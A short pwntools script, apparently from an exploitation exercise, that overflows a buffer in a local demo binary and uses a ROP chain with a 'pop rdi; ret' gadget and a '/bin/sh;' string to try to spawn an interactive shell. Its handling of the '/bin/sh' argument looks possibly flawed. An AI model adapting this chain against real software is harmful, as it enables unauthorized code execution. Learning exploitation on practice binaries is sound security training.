from pwn import *
p = process("./demo_win")
gdb.attach(p)

chain = "aaaaaaaaaabbbbbbbb"
#chain = ""
chain += p64(0x40044e)
chain += p64(0x400663)    # pop rdi; ret 
chain += "/bin/sh;"
chain += p64(0x400460)

p.sendline(chain)
p.interactive()
